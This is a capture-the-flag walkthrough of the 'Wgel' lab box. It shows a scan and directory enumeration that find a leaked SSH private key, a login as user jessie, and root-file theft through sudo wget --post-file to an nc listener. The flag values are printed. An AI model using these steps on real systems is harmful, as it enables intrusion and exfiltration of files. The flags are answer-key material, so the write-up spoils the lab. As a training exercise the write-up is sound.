# Wgel CTF

## Description

Have fun with this easy box.

# Initial Scan

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 5.4 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Nmap scan shows two open ports:

* 22 ssh
* 80 http

# Web

The ssh service requiers creds, so i moved on to http. I started enumerating by running gobuster on the web page. While it was running I started checking the source code and found a possible username: `jessie`

Gobuster found `/sitemap`. I ran gobuster on it again and ended up finding a very useful file.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/Wgel]
└─$ gobuster dir -u http://$IP:80/sitemap/.ssh -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.38:80/sitemap/.ssh
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/22 06:08:49 Starting gobuster in directory enumeration mode
===============================================================
/id_rsa               (Status: 200)
~~~

# Gaining a Shell

This file contained a private RSA key. I saved it as "rsa_key" and set its permission to 600 and then using the username I found earlier, logged on SSH service and now I have a shell as "jessie".

~~~
┌──(user㉿Y0B01)-[~/…/walkThroughs/thm/Wgel/files]
└─$ chmod 600 rsa_key  
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkThroughs/thm/Wgel/files]
└─$ ssh -i rsa_key jessie@$IP
The authenticity of host '10.10.194.38 (10.10.194.38)' can't be established.
ECDSA key fingerprint is SHA256:9XK3sKxz9xdPKOayx6kqd2PbTDDfGxj9K9aed2YtF0A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.194.38' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
~~~

# User Flag

I started looking around in the home directory and found the user flag in `~/Documents`.

~~~
jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
~~~

user flag: `057c67131c3d5e42dd5cd3075b198ff6`

## Root Flag

Now I need to gain the root flag. I ran `sudo -l` and I can run `wget` with sudo and no apssword. There many thing we can do here but I go with the faster one. We can use this command to post files too. After seeing the user flag's name we can kinda guess the name of the root flag file. So I started a listener on my machine and then posted the root flag to my machine.

On my machine:
~~~
┌──(user㉿Y0B01)-[~/…/walkThroughs/thm/Wgel/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
~~~

On target machine:
~~~
jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.9.0.154:4444
--2021-09-22 14:04:37--  http://10.9.0.154:4444/
Connecting to 10.9.0.154:4444... connected.
HTTP request sent, awaiting response...
~~~

And now the root flag has been sent.
~~~
┌──(user㉿Y0B01)-[~/…/walkThroughs/thm/Wgel/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.0.154] from (UNKNOWN) [10.10.194.38] 38728
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.0.154:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
~~~

Root flag: `b1b968b37519ad1daa6408188649263d`

# D0N3! ; )

Hope you had fun hacking! : )